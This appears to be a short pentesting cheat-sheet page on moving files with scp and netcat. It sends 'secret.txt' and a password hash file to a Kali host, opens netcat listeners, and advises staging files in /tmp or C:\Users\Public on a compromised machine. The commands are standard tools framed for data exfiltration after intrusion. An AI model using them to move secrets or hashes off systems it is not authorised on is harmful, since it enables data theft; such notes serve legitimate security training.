---
layout: default
title: SCP Transfer
permalink: /scp_transfer/
---

# Transfering over SSH/SCP

### Sender

`scp secret.txt kali@10.10.10.79:/path/to/dir`
`scp ./hash.txt kracken@192.168.0.45:"C:\\Users\\kracken\\Desktop\\hacking\\hashes\\hash.txt"`

### Receiver

`scp kracken@192.168.0.45:"/C:/Users/kracken/Desktop/crack" .`

## NetCat

receiver:
`nc -lvp 5555 > file.txt`
and then sender:
`nc 192.168.31.141 5555 < file.txt`
`nc -w 3 [destination] <Port_number> < <file_name>`

On Windows:
`nc.exe 192.168.31.141 5555 < data.txt`
`nc -lvp 5555 > data.txt`



Useful notes:
- On Linux receiving: worth using /tmp directory, as it is globally readable, writeable and executable.
- On Windows the C:\Users\Public\ directory is accessible to all users on a Windows system.
- Upgrade your shell if possible.
- If one method doesn't work, try another one.
